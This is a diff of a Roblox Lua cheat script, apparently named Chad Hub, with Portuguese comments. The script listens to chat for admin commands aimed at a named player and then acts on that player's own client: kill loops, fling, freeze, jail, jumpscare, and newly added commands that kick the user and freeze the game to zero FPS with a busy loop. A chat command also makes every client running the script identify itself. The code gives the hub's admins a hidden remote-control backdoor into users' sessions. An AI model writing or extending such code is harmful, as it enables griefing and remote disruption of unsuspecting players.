@@ -152,18 +152,20 @@ if IS_ADMIN then
     end
 
     local actions = {
-    {"Matar", "kill"}, 
-    {"Kill Loop", "killloop"}, 
+    {"/kill", "kill"}, 
+    {"/Kill Loop", "killloop"}, 
     {"Parar Kill Loop", "unkillloop"}, 
-    {"Lançar (Fling)", "fling"}, 
-    {"Sentar", "sit"},
-    {"Congelar", "frozen"}, 
-    {"Descongelar", "unfrozen"},
-    {"Girar", "spin"}, 
-    {"Parar Girar", "unspin"},
-    {"Prender Caixa", "caixa"}, 
-    {"Remover Caixa", "uncaixa"},
-    {"Jumpscare", "jumpscare"}
+    {"/Fling", "fling"}, 
+    {"/sit", "sit"},
+    {"/frozen", "frozen"}, 
+    {"/unfrozen", "unfrozen"},
+    {"/spin", "spin"}, 
+    {"/unspin", "unspin"},
+    {"/jail", "caixa"}, 
+    {"/unjail", "uncaixa"},
+    {"/Jumpscare", "jumpscare"},
+    {"/kick", "kick"}, -- Novo
+    {"/lag", "lag"} -- Novo
 }
 
     for _, d in pairs(actions) do
@@ -235,18 +237,18 @@ end
 TextChatService.MessageReceived:Connect(function(msg)
     local text = msg.Text:lower()
     
-    -- 1. LÓGICA DE VERIFICAÇÃO (Comando: ;verifique todos)
+    -- 1. LÓGICA DE VERIFICAÇÃO
     if text == ";verifique todos" then
         task.spawn(function()
-            task.wait(math.random(0.5, 1.5)) -- Delay para parecer humano
+            task.wait(math.random(0.5, 1.5))
             if chatChannel then
                 chatChannel:SendAsync("Usuário Do Chad")
             end
         end)
-        return -- Interrompe aqui para não confundir com comandos de alvo
+        return 
     end
 
-    -- 2. CAPTURA DE COMANDOS COM ALVO (Ex: ;killloop player)
+    -- 2. CAPTURA DE COMANDOS COM ALVO
     local cmd, target = text:match("^;(.-)%s+([^%s]+)$")
     
     if cmd and target and target == localPlayer.Name:lower() then
@@ -254,16 +256,30 @@ TextChatService.MessageReceived:Connect(function(msg)
         local hum = char and char:FindFirstChildOfClass("Humanoid")
         local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
+        -- [[ NOVO: FUNÇÃO KICK ]]
+        if cmd == "kick" then
+            localPlayer:Kick("\n\nVocê Foi Expulso Por Chad Hub Admin\n")
+
+        -- [[ NOVO: FUNÇÃO LAG ]]
+        elseif cmd == "lag" then
+            task.spawn(function()
+                local t = tick()
+                while tick() - t < 10 do -- Trava por 10 segundos
+                    for i = 1, 1000000 do 
+                        -- Esse loop vazio pesado faz o FPS cair para 0
+                    end
+                    task.wait(0.01)
+                end
+            end)
+
         -- [[ FUNÇÃO: KILL LOOP ]]
-        if cmd == "killloop" then
+        elseif cmd == "killloop" then
             _G.KillLoopPlayers[localPlayer.Name] = true
             task.spawn(function()
                 while _G.KillLoopPlayers[localPlayer.Name] do
                     local currentHum = (localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid"))
-                    if currentHum then
-                        currentHum.Health = 0
-                    end
-                    localPlayer.CharacterAdded:Wait() -- Espera o player renascer para matar de novo
+                    if currentHum then currentHum.Health = 0 end
+                    localPlayer.CharacterAdded:Wait()
                     task.wait(0.5)
                 end
             end)
@@ -281,32 +297,20 @@ TextChatService.MessageReceived:Connect(function(msg)
                 img.Image = "rbxassetid://12433698744"
                 img.BackgroundTransparency = 1
                 img.ZIndex = 999999
-                
                 local sound = Instance.new("Sound", game:GetService("SoundService"))
                 sound.SoundId = "rbxassetid://130280049435018"
                 sound.Volume = 10
                 sound:Play()
-                
                 task.wait(3)
                 sg:Destroy()
                 sound:Destroy()
             end)
 
-        -- [[ FUNÇÃO: MATAR SIMPLES ]]
-        elseif cmd == "kill" then 
-            if hum then hum.Health = 0 end
-
-        -- [[ FUNÇÃO: FLING ]]
-        elseif cmd == "fling" then 
-            if hrp then hrp.Velocity = Vector3.new(0, 10000, 0) end
-
-        -- [[ FUNÇÃO: CONGELAR ]]
-        elseif cmd == "frozen" then 
-            if hum then hum.PlatformStand = true end
-        elseif cmd == "unfrozen" then 
-            if hum then hum.PlatformStand = false end
-
-        -- [[ FUNÇÃO: GIRAR ]]
+        -- [[ MANTENDO RESTO DOS COMANDOS ]]
+        elseif cmd == "kill" then if hum then hum.Health = 0 end
+        elseif cmd == "fling" then if hrp then hrp.Velocity = Vector3.new(0, 10000, 0) end
+        elseif cmd == "frozen" then if hum then hum.PlatformStand = true end
+        elseif cmd == "unfrozen" then if hum then hum.PlatformStand = false end
         elseif cmd == "spin" then 
             SpinPlayers[localPlayer.Name] = true
             task.spawn(function()
@@ -315,10 +319,7 @@ TextChatService.MessageReceived:Connect(function(msg)
                     task.wait()
                 end
             end)
-        elseif cmd == "unspin" then 
-            SpinPlayers[localPlayer.Name] = nil
-
-        -- [[ FUNÇÃO: CAIXA ]]
+        elseif cmd == "unspin" then SpinPlayers[localPlayer.Name] = nil
         elseif cmd == "caixa" then 
             if hrp and not CaixaPlayers[localPlayer.Name] then
                 local m = Instance.new("Model", workspace)
@@ -332,17 +333,12 @@ TextChatService.MessageReceived:Connect(function(msg)
                 CaixaPlayers[localPlayer.Name] = m
             end
         elseif cmd == "uncaixa" then 
-            if CaixaPlayers[localPlayer.Name] then 
-                CaixaPlayers[localPlayer.Name]:Destroy()
-                CaixaPlayers[localPlayer.Name] = nil 
-            end
-            
-        -- [[ FUNÇÃO: SENTAR ]]
-        elseif cmd == "sit" then 
-            if hum then hum.Sit = true end
+            if CaixaPlayers[localPlayer.Name] then CaixaPlayers[localPlayer.Name]:Destroy(); CaixaPlayers[localPlayer.Name] = nil end
+        elseif cmd == "sit" then if hum then hum.Sit = true end
         end
     end
 end)
+
 
 RunService.RenderStepped:Connect(function(dt)
     if SpinPlayers[localPlayer.Name] then
@@ -6028,6 +6024,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
